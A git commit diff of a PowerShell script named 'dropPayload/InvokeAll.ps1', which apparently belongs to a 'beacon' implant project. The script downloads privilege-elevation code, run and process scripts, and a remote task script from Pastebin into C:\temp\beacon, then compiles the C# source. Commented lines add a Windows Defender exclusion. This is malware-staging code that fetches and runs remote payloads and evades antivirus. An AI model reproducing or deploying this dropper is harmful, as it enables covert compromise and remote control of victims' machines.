61560b68fcbf21ee3ead0d9a1c3f725c494fcdfa
currone <agungrambujana@gmail.com>
2024-01-31 14:53:14 +0700

    rawUrlChange

--- dropPayload/InvokeAll.ps1
+++ dropPayload/InvokeAll.ps1
@@ -6,16 +6,16 @@ mkdir C:\temp\beacon\elevate
 # # Excludes file paths
 # Add-MpPreference -ExclusionPath "C:\temp" -ErrorAction Stop
 
-Invoke-Restmethod -Uri https://raw.githubusercontent.com/snackmasta/beacon/master/elevate/Source.cs > C:\temp\beacon\elevate\Source.cs
-Invoke-Restmethod -Uri https://raw.githubusercontent.com/snackmasta/beacon/master/elevate/compile.ps1 > C:\temp\beacon\elevate\compile.ps1
-Invoke-Restmethod -Uri https://raw.githubusercontent.com/snackmasta/beacon/master/elevate/Elevate.ps1 > C:\temp\beacon\elevate\Elevate.ps1
-Invoke-Restmethod -Uri https://raw.githubusercontent.com/snackmasta/beacon/master/elevate/elevinit.ps1 > C:\temp\beacon\elevate\elevinit.ps1
-Invoke-Restmethod -Uri https://raw.githubusercontent.com/snackmasta/beacon/master/run.ps1 > C:\temp\beacon\run.ps1
-Invoke-Restmethod -Uri https://raw.githubusercontent.com/snackmasta/beacon/master/newprocess.ps1 > C:\temp\beacon\newprocess.ps1
-Invoke-Restmethod -Uri https://raw.githubusercontent.com/snackmasta/beacon/master/GetState.ps1 > C:\temp\beacon\GetState.ps1
+Invoke-Restmethod -Uri https://raw.githubusercontent.com/snackmasta/beacon/v0.0.1/elevate/Source.cs > C:\temp\beacon\elevate\Source.cs
+Invoke-Restmethod -Uri https://raw.githubusercontent.com/snackmasta/beacon/v0.0.1/elevate/compile.ps1 > C:\temp\beacon\elevate\compile.ps1
+Invoke-Restmethod -Uri https://raw.githubusercontent.com/snackmasta/beacon/v0.0.1/elevate/Elevate.ps1 > C:\temp\beacon\elevate\Elevate.ps1
+Invoke-Restmethod -Uri https://raw.githubusercontent.com/snackmasta/beacon/v0.0.1/elevate/elevinit.ps1 > C:\temp\beacon\elevate\elevinit.ps1
+Invoke-Restmethod -Uri https://raw.githubusercontent.com/snackmasta/beacon/v0.0.1/run.ps1 > C:\temp\beacon\run.ps1
+Invoke-Restmethod -Uri https://raw.githubusercontent.com/snackmasta/beacon/v0.0.1/newprocess.ps1 > C:\temp\beacon\newprocess.ps1
+Invoke-Restmethod -Uri https://raw.githubusercontent.com/snackmasta/beacon/v0.0.1/GetState.ps1 > C:\temp\beacon\GetState.ps1
 Invoke-Restmethod -Uri https://pastebin.com/raw/urK1nS7q > C:\temp\beacon\task.ps1
-Invoke-Restmethod -Uri https://raw.githubusercontent.com/snackmasta/beacon/master/TCPState.ps1 > C:\temp\beacon\TCPState.ps1
-Invoke-Restmethod -Uri https://raw.githubusercontent.com/snackmasta/beacon/master/elevate/haxmode.ps1 > C:\temp\beacon\elevate\haxmode.ps1
+Invoke-Restmethod -Uri https://raw.githubusercontent.com/snackmasta/beacon/v0.0.1/TCPState.ps1 > C:\temp\beacon\TCPState.ps1
+Invoke-Restmethod -Uri https://raw.githubusercontent.com/snackmasta/beacon/v0.0.1/elevate/haxmode.ps1 > C:\temp\beacon\elevate\haxmode.ps1
 
 # Compile the C# source code into a DLL
 C:\temp\beacon\elevate\compile.ps1
